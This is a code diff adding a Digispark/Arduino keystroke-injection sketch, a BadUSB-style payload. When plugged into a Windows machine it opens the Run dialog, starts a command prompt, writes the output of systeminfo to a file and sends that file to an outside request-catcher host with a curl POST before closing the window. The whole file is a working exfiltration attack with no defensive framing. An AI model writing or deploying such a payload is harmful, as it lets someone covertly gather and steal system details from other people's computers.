@@ -1,0 +1,18 @@
+#include <DigiKeyboard.h>
+
+void setup() {
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyPress(KEY_R, MOD_GUI_LEFT); 
+  DigiKeyboard.sendKeyPress('r');
+  DigiKeyboard.delay(500);           
+  DigiKeyboard.println("cmd");
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.println("systeminfo > D:\\system_info.txt");
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.println("curl -X POST -d @D:\\system_info.txt https://test1234.requestcatcher.com");
+  DigiKeyboard.delay(2000);
+  DigiKeyboard.println("exit");
+}
+
+void loop() {
+}
